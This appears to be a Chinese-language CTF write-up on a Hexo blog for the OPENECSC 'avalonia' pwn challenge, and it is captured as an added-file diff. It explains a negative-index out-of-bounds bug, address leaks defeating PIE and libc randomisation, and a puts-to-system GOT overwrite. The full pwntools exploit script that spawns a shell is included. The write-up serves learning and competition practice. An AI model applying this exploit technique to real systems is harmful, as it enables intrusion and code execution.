@@ -1,0 +1,653 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目简介ctftime上的OPENECSC比赛题，链接：OPENECSC:avalonia">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025-10-02-OPENECSC-avalonia">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/10/07/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/index.html">
+<meta property="og:site_name" content="0x4A">
+<meta property="og:description" content="题目简介ctftime上的OPENECSC比赛题，链接：OPENECSC:avalonia">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/checksec.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-main.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_add_note.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-add_note.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_edit_note.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-edit_note.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-get_index.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-check_index.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_view_note.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_delete_note.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-view-detail.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/find-elf.png">
+<meta property="article:published_time" content="2025-10-07T07:53:50.000Z">
+<meta property="article:modified_time" content="2025-10-08T05:31:25.312Z">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/checksec.png">
+  
+  
+  
+  <title>2025-10-02-OPENECSC-avalonia - 0x4A</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0x4a-210.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0x4A</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Istaroth.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025-10-02-OPENECSC-avalonia"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-07 15:53" pubdate>
+          October 7, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025-10-02-OPENECSC-avalonia</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>ctftime上的OPENECSC比赛题，链接：<a target="_blank" rel="noopener" href="https://openec.sc/#challenges">OPENECSC:avalonia</a><br></p>
+<span id="more"></span>
+<p>这道题感觉漏洞点比较隐蔽，泄露地址的思路感觉也比较偏门，还融合了覆写GOT表和one gadget手法，都是目前不熟悉的<br></p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>checksec，看到保护基本全开，除了GOT表是Partial：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/checksec.png" srcset="/img/loading.gif" lazyload><br>IDA反编译，先看main函数，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-main.png" srcset="/img/loading.gif" lazyload><br>先看函数表，没有malloc和free，首先排除堆题可能<br><br>菜单程序，逐步分析每个功能，先看添加部分：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_add_note.png" srcset="/img/loading.gif" lazyload><br>只有一个输入的地方，允许输入156字节，但够不到返回地址，没有栈溢出，然后跟进add_note：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-add_note.png" srcset="/img/loading.gif" lazyload><br>发现首先把我们的输入拷贝到一个bss段上的指针notePtr_+4的位置，然后前4个字节写入当前时间戳，最后把指针存到bss段上的一个指针数组noteptrs处<br><br>传入的参数最多只有156字节，notePtr_预留的有156+4刚好160字节，没有溢出，同时在notePtr_的末尾手动添加0x00，因此这里也没有明显可以溢出的地方<br><br>再看edit功能：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_edit_note.png" srcset="/img/loading.gif" lazyload><br>首先让我们输入要修改的note下标，然后同样是fgets限制在156字节，然后进入edit_note：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-edit_note.png" srcset="/img/loading.gif" lazyload><br>表面上看貌似没有可以溢出的地方，但是看到有用下标索引的动作，而且有一个自定义的读取下标函数，考虑是否存在下标越界错误？<br><br>跟进get_index：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-get_index.png" srcset="/img/loading.gif" lazyload><br>看到首先从scanf读取4个字节的整数，即一个int，然后会调用check_index检查下标是否合法，跟进check_index：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-check_index.png" srcset="/img/loading.gif" lazyload><br>看上去也没什么问题，保证不会超过10个note，而notes预留的大小正好是1600字节<br><br>于是先往下看view功能，输出功能一般来说是不可能存在溢出点的，因此主要寻找泄露地址的机会：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_view_note.png" srcset="/img/loading.gif" lazyload><br>看到view会首先用get_index读取要显示的note的下标，然后把时间戳转换成time结构体输出，接着从+4处取note内容输出<br><br>get_index不会超过10，没有越界，因此看上去也没有泄露地址的机会<br><br>最后看delete功能：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-do_delete_note.png" srcset="/img/loading.gif" lazyload><br>和edit以及view一样，从get_index读取要删除的坐标，然后把noteptrs对应位置置空<br><br>分析下来发现好像根本没有漏洞点，但其实我的分析遗漏了一个地方：下标不能超过9，但是下标可以为负数吗？如果可以，那就能在低于noteptrs的空间实现任意地址读写<br><br>而再次回头来检查get_index和check_index函数，发现只存在对下标是否不超过9的校验，而没有对是否大于0的校验<br><br>至此，漏洞点明确了，即在edit和view功能中，由于下标可以为负数，导致存在noteptrs以下地址空间的任意读和写<br></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>拿到任意地址读写以后，结合checksec的结果，可以想到改掉某个函数的GOT表；注意view函数的如下部分：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/IDA-view-detail.png" srcset="/img/loading.gif" lazyload><br>由于notePtr_+4的内容是我们可控的，因此想到可以覆盖puts的GOT表<br><br>接下来是泄露地址的问题，首先需要泄露libc地址，因此要先在某个libc函数的GOT表处完成任意读，即让notePtr_等于某个函数的GOT段地址<br><br>但是开启了PIE保护，我们只知道got段的偏移，于是要先泄露程序装载基地址<br><br>但是哪个地址存储了一个和程序区段有关的地址呢？这里只能通过gdb调试去猜测，大概范围是noteptrs往上1600字节之前（即notes之前，因为notes预留了1600字节，而且肯定不在bss段——初始化全0）<br><br>最后在noteptrs上方210*8个字节处找到一个和程序段固定偏移的地址，如下图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/2025-10-02-OPENECSC-avalonia/find-elf.png" srcset="/img/loading.gif" lazyload><br>之后只要调用view功能越界读这块内存即可，代码如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#noteptrs-210*8的位置有一个程序内部固定偏移（0x4050）的地址，gdb调试获得</span><br>elfBase=LeakAddr(-<span class="hljs-number">210</span>)-<span class="hljs-number">0x4050</span><br></code></pre></td></tr></table></figure>
+<p>之后是泄露libc地址，具体思路是首先把puts函数GOT表的地址放在noteptrs上方的某个可控地址空间，其实可以放到notes附近，这部分对应的代码如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">Add(<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>libcBase=LeakAddr(-<span class="hljs-number">199</span>)-libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br></code></pre></td></tr></table></figure>
+<p>拿到libc地址之后，首先布置好一个”&#x2F;bin&#x2F;sh”字符串的参数，之后将puts函数GOT表-4的值同样布置到notes附近，最后调用Edit完成覆盖，如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Add(<span class="hljs-string">&quot;/bin/sh&quot;</span>)  <span class="hljs-comment">#1号位置填好参数/bin/sh</span><br><span class="hljs-comment">#覆盖puts的GOT表</span><br>Add(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]-<span class="hljs-number">4</span>))<br>Edit(-<span class="hljs-number">159</span>,p64(libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>])) <br></code></pre></td></tr></table></figure>
+<p>最后调用一次View，输出1号下标的&#x2F;bin&#x2F;sh，实际就会执行system(“&#x2F;bin&#x2F;sh”)<br><br>完整exp如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timezone<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./app&quot;</span><br>libcPath=<span class="hljs-string">&quot;/home/k40/Pwn/Exercise/OPENECSC-avalonia/libc.so.6&quot;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br>mode=REMOTE<br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>():<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        io=process(targetELF)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        io=remote(<span class="hljs-string">&quot;89383b86-6177-4e66-8113-0770b7acd413.openec.sc&quot;</span>,<span class="hljs-number">31337</span>,ssl=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> io<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        io=gdb.debug(targetELF,<span class="hljs-string">&quot;b *do_view_note+376&quot;</span>)<br>        <span class="hljs-keyword">return</span> io<br><br>ioTube=Lauch()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">content_</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter note content &gt; &quot;</span>)<br>    ioTube.sendline(content_)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Edit</span>(<span class="hljs-params">idx,content_</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter index of note to edit &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-built_in">str</span>(idx))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter note content: &quot;</span>)<br>    ioTube.sendline(content_)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Delete</span>(<span class="hljs-params">idx</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    ioTube.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">View</span>(<span class="hljs-params">idx</span>):<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Enter index of note to view &gt; &quot;</span>)<br>    ioTube.sendline(<span class="hljs-built_in">str</span>(idx))<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Modified on &quot;</span>)<br>    times_=ioTube.recvline(keepends=<span class="hljs-literal">False</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Content: \&quot;&quot;</span>)<br>    content_=ioTube.recvline(keepends=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">return</span> content_,times_<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">LeakAddr</span>(<span class="hljs-params">idx</span>):<br>    content_,times_=View(idx)<br>    epoch32 = <span class="hljs-built_in">int</span>(datetime.strptime(times_.decode(), <span class="hljs-string">&quot;%d/%m/%Y %I:%M:%S %p&quot;</span>).replace(tzinfo=timezone.utc).timestamp()) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment">#取前4个字节</span><br>    note_val = <span class="hljs-built_in">int</span>.from_bytes(content_, <span class="hljs-string">&quot;little&quot;</span>)  <span class="hljs-comment">#后4个字节</span><br>    <span class="hljs-keyword">return</span> (note_val &lt;&lt; <span class="hljs-number">32</span>) | epoch32  <span class="hljs-comment">#拼接=一个8字节地址</span><br><br><span class="hljs-comment">#noteptrs-210*8的位置有一个程序内部固定偏移（0x4050）的地址，gdb调试获得？</span><br>elfBase=LeakAddr(-<span class="hljs-number">210</span>)-<span class="hljs-number">0x4050</span><br><br>Add(<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>libcBase=LeakAddr(-<span class="hljs-number">199</span>)-libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>Add(<span class="hljs-string">&quot;/bin/sh&quot;</span>)  <span class="hljs-comment">#1号位置填好参数/bin/sh</span><br><span class="hljs-comment">#覆盖puts的GOT表</span><br>Add(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">4</span>+p64(elfBase+elf.got[<span class="hljs-string">&quot;puts&quot;</span>]-<span class="hljs-number">4</span>))<br>Edit(-<span class="hljs-number">159</span>,p64(libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]))  <br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Choice &gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter index of note to view &gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">pwn刷题记录</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/" class="category-chain-item">其他技巧类</a>
+  
+  
+    <span>></span>
+    
